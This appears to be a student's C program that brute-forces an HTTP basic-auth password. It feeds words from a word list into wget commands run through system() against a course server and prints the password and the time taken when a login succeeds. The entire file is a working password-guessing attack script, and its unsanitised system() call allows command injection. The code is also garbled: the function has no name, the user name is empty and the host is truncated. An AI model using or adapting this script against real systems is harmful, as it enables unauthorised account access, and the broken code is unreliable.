#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
#include<time.h>

int ()
{

 int m,n,o,i;
 time_t u1,u2;
 char v[3];
 char temp1[100];
 char temp2[100];
 char temp3[250];
 FILE *fin1;
 
 char point[25];
  fin1=fopen("./words.txt","r");
  
  if(fin1==NULL)
  {
   printf(" open the file ");
   exit(0);
  } 
  

 strcpy(temp2," --http-user= --http-passwd=");
 strcpy(temp1,"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php");
 
   strcpy(temp3,"");
   
   (void) time(&u1); 
   
   while(!feof(fin1))  
   {
    
    fgets(point,25,fin1);
    if(strlen(point)<=4)
    {
   
    
    strcpy(temp3,temp1);
    strcat(temp3,temp2);
     strcat(temp3,point);
    printf("\nSending the  %s\n",temp3);
    i=system(temp3);  
   	
	if(i==0)
   	{
	 (void) time(&u2); 
	 printf("\n The password is %s\n",point);
	 printf("\n\nThe time_var taken  crack the passwork is  %d  second\n\n",(int)(u2-u1));
     	 exit(0);
   	} 
	else
	{
	strcpy(temp3,"");
	}
   
   
    }
  }
   
  
}  
